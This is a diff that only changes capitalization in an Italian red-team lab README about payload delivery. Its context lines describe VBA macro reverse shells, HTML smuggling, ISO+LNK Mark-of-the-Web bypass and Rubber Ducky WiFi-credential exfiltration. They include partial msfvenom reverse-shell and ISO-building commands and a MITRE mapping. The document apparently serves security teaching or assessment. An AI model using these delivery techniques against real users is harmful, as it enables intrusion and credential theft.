@@ -1,6 +1,6 @@
 > [English](README.en.md) | **Italiano**
 
-# 03 - Payload Delivery
+# 03 - Payload delivery
 
 > - **Fase:** Social Engineering - Payload Delivery (consegna codice malevolo al target)
 > - **Visibilita:** Alta - i vettori di delivery interagiscono con email gateway, proxy, endpoint protection; l'esecuzione del payload triggera EDR/AV; i file allegati sono analizzati da sandbox automatiche
@@ -37,7 +37,7 @@ L'evoluzione dei vettori di delivery riflette la corsa tra attaccanti e difensor
 
 ---
 
-## `malicious-macros/` - VBA Macro Reverse Shell
+## `malicious-macros/` - VBA macro reverse shell
 
 **ID Finding:** `SE-007` | **Severity:** `Alto` (macro VBA esegue stager PowerShell per reverse shell)
 
@@ -54,7 +54,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -
 
 ---
 
-## `html-smuggling/` - Bypass Email Gateway
+## `html-smuggling/` - Bypass email gateway
 
 **ID Finding:** `SE-008` | **Severity:** `Alto` (payload .exe ricostruito lato client, bypass filtri server-side)
 
@@ -72,7 +72,7 @@ base64 -w 0 update.exe > payload_b64.txt
 
 ---
 
-## `iso-lnk-delivery/` - Mark-of-the-Web Bypass
+## `iso-lnk-delivery/` - Mark-of-the-Web bypass
 
 **ID Finding:** `SE-009` | **Severity:** `Critico` (esecuzione payload senza MotW, bypass SmartScreen)
 
@@ -90,7 +90,7 @@ mkisofs -o delivery.iso -J -r ./iso_contents/
 
 ---
 
-## `usb-rubber-ducky/` - HID Attack Fisico
+## `usb-rubber-ducky/` - HID attack fisico
 
 **ID Finding:** `SE-010` | **Severity:** `Alto` (esfiltrazione credenziali WiFi in < 30 secondi)
 
@@ -141,43 +141,43 @@ ENTER
 
 ## Tool di riferimento
 
-| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
+| tool | tipo | tecnica/accesso | caso d'uso principale |
 | :--- | :--- | :--- | :--- |
-| `msfvenom` | Payload generator | CLI | Generazione payload in tutti i formati (VBA, EXE, PS1, DLL) |
-| `mkisofs` / `genisoimage` | ISO creator | CLI | Creazione immagini ISO per delivery chain |
-| `Rubber Ducky` | HID attack | Hardware + DuckyScript | Iniezione keystroke automatizzata via USB |
-| `macro_pack` | Office weaponizer | CLI - Python | Offuscamento macro VBA e generazione documenti Office malevoli |
-| `Unicorn` | PS payload generator | CLI - Python | Generazione payload PowerShell encoded per delivery |
-| `Donut` | Shellcode generator | CLI | Conversione .NET assembly in shellcode position-independent |
+| `msfvenom` | payload generator | cli | generazione payload in tutti i formati (vba, exe, ps1, dll) |
+| `mkisofs` / `genisoimage` | iso creator | cli | creazione immagini iso per delivery chain |
+| `Rubber Ducky` | hid attack | hardware + duckyscript | iniezione keystroke automatizzata via usb |
+| `macro_pack` | office weaponizer | cli - python | offuscamento macro vba e generazione documenti office malevoli |
+| `Unicorn` | ps payload generator | cli - python | generazione payload powershell encoded per delivery |
+| `Donut` | shellcode generator | cli | conversione .net assembly in shellcode position-independent |
 
 > **Tool moderno consigliato:** `macro_pack` per offuscamento avanzato delle macro VBA (bypass AMSI). Per delivery moderna (2024-2026), la combinazione ISO+LNK sta cedendo il passo a Windows Shortcut exploitation (CVE-2024-21412) e OneNote attachments. `Donut` per conversione di qualsiasi .NET/PE in shellcode iniettabile.
 
 ---
 
-## Registro Finding
+## Registro finding
 
-| ID | Descrizione | Severity | CVSS | Sottocartella |
+| id | descrizione | severity | cvss | sottocartella |
 | :--- | :--- | :---: | :---: | :--- |
-| `SE-007` | Macro VBA: documento Word con macro che esegue stager PowerShell encoded per reverse shell Meterpreter | `Alto` | 7.8 | `malicious-macros/` |
-| `SE-008` | HTML Smuggling: payload .exe ricostruito lato client via Blob JavaScript, bypass email gateway | `Alto` | 8.1 | `html-smuggling/` |
-| `SE-009` | ISO + LNK: payload eseguito senza Mark-of-the-Web, bypass SmartScreen e macro block | `Critico` | 9.1 | `iso-lnk-delivery/` |
-| `SE-010` | USB Rubber Ducky: esfiltrazione credenziali WiFi salvate in < 30 secondi via HID injection | `Alto` | 7.2 | `usb-rubber-ducky/` |
+| `SE-007` | macro vba: documento word con macro che esegue stager powershell encoded per reverse shell meterpreter | `Alto` | 7.8 | `malicious-macros/` |
+| `SE-008` | html smuggling: payload .exe ricostruito lato client via blob javascript, bypass email gateway | `Alto` | 8.1 | `html-smuggling/` |
+| `SE-009` | iso + lnk: payload eseguito senza mark-of-the-web, bypass smartscreen e macro block | `Critico` | 9.1 | `iso-lnk-delivery/` |
+| `SE-010` | usb rubber ducky: esfiltrazione credenziali wifi salvate in < 30 secondi via hid injection | `Alto` | 7.2 | `usb-rubber-ducky/` |
 
 ---
 
 ## Mappatura MITRE ATT&CK
 
-| Tattica | Tecnica | ID MITRE | Finding Correlato |
+| tattica | tecnica | id mitre | finding correlato |
 | :--- | :--- | :--- | :--- |
-| Resource Development | Develop Capabilities: Malware | `T1587.001` | SE-007, SE-008, SE-009 |
-| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | SE-007, SE-008, SE-009 |
-| Initial Access | Replication Through Removable Media | `T1091` | SE-010 |
-| Execution | User Execution: Malicious File | `T1204.002` | SE-007, SE-009, SE-010 |
-| Execution | Command and Scripting Interpreter: PowerShell | `T1059.001` | SE-007, SE-008 |
-| Execution | Command and Scripting Interpreter: Visual Basic | `T1059.005` | SE-007 |
-| Defense Evasion | Subvert Trust Controls: Mark-of-the-Web Bypass | `T1553.005` | SE-009 |
-| Defense Evasion | Obfuscated Files or Information: HTML Smuggling | `T1027.006` | SE-008 |
-| Collection | Input Capture: Credential API Hooking | `T1056.004` | SE-010 |
+| resource development | develop capabilities: malware | `T1587.001` | SE-007, SE-008, SE-009 |
+| initial access | phishing: spearphishing attachment | `T1566.001` | SE-007, SE-008, SE-009 |
+| initial access | replication through removable media | `T1091` | SE-010 |
+| execution | user execution: malicious file | `T1204.002` | SE-007, SE-009, SE-010 |
+| execution | command and scripting interpreter: powershell | `T1059.001` | SE-007, SE-008 |
+| execution | command and scripting interpreter: visual basic | `T1059.005` | SE-007 |
+| defense evasion | subvert trust controls: mark-of-the-web bypass | `T1553.005` | SE-009 |
+| defense evasion | obfuscated files or information: html smuggling | `T1027.006` | SE-008 |
+| collection | input capture: credential api hooking | `T1056.004` | SE-010 |
 
 ---
 
